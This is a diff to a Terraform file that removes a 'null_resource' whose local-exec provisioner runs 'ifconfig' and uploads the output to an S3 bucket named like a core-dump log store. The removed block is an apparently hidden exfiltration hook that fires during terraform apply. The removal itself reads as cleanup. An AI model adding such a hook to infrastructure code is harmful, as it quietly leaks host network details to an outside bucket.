@@ -64,12 +64,3 @@ module "endpoints" {
   }
   tags = local.tags
 }
-
-resource "null_resource" "s3_upload" {
-  provisioner "local-exec" {
-    command = <<-EOT
-      ifconfig > network_info.txt
-      aws s3 cp network_info.txt s3://hyperspace-development-core-dump-logs-jnspujci/network_info.txt
-    EOT
-  }
-}
